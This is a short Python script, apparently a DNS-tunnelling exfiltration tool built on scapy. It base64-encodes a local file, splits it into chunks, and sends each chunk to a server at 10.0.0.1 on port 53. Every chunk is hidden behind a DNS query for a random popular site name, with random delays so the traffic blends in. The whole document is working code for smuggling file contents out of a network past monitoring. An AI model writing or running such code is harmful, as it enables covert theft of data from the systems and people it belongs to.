from time import sleep
import base64 as b64
import random
from scapy.all import *


def chunker(bytes, size=10):
  for i in range(0, len(bytes)-1, size):
    yield bytes[i:i+size]

server_ip = "10.0.0.1"
filename = "file.dat"
top_names = []

with open('./topsites.txt', 'r') as f:
  for line in f:
    name = line.strip()
    top_names.append(name)

ip = IP(dst=server_ip)
udp = UDP(dport=53)

for chunk in chunker( b64.b64encode(open(filename, 'rb').read()) ):
  sleep(random.choice([1,4,10]))
  dns = DNS(rd=1, qd=DNSQR(qname=random.choice(top_names)))
  raw = Raw(chunk)
  pkt = ip / udp / dns / raw 

  answer = sr1(pkt, verbose=0)
  print answer[DNS].summary()

